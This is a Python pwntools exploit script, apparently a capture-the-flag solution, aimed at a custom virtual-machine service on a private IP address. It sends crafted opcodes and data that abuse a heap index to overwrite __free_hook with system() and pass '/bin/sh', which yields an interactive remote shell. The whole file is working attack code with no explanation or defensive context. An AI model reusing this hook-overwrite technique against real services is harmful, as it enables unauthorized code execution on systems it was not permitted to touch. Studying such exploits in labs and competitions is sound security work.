#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0
binary_name = 'bin'

if local:
	cn = process('./'+binary_name)
else:
	cn = remote('192.168.67.15',8888)

ru = lambda x : cn.recvuntil(x)
sn = lambda x : cn.send(x)
rl = lambda   : cn.recvline()
sl = lambda x : cn.sendline(x)
rv = lambda x : cn.recv(x)
sa = lambda a,b : cn.sendafter(a,b)
sla = lambda a,b : cn.sendlineafter(a,b)


bin = ELF('./'+binary_name,checksec=False)


def z(a=''):
	if local:
		gdb.attach(cn,a)
		if a == '':
			raw_input()
	else:
		pass

push = 0x2A3D
pop  = 0xFFFF28
add  = 0x0
sub  = 0x11111
mul  = 0xABCEF
div  = 0x514
load = -1
save = 0x10101010

system_addr = 0x8051c60
free_hook = 0x80e09f0
def create(d):
    return " ".join([str(x) for x in d])

heap_offset = (0x110-8) // 4
code = create([push,push,push,push,load,push,sub,div,save])
data = create(["/bin/sh",system_addr,4,heap_offset,free_hook])
cn.sendline(code)
cn.sendline(data)
cn.interactive()
